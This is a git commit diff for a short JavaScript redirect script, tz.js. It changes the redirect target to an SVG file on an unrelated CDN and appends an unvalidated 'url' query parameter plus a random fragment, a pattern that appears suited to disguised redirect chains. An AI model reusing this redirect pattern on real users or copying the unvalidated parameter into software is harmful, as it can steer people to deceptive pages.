db608981b947f183ede246a2c254106c0d4983cc
jinse11111 <3458422924@qq.com>
2024-06-26 14:41:36 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://oss.homeee.com/OverseasChn/Formal/TH/rent/926cf308adf3.html";
+let redirectURL = "http://cdn.bypms.cn./statics/resources/pro/b_c_174254/we_shop/20240625_2a2de8d87b544b1f8a1bf4254c59f5fa.svg";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
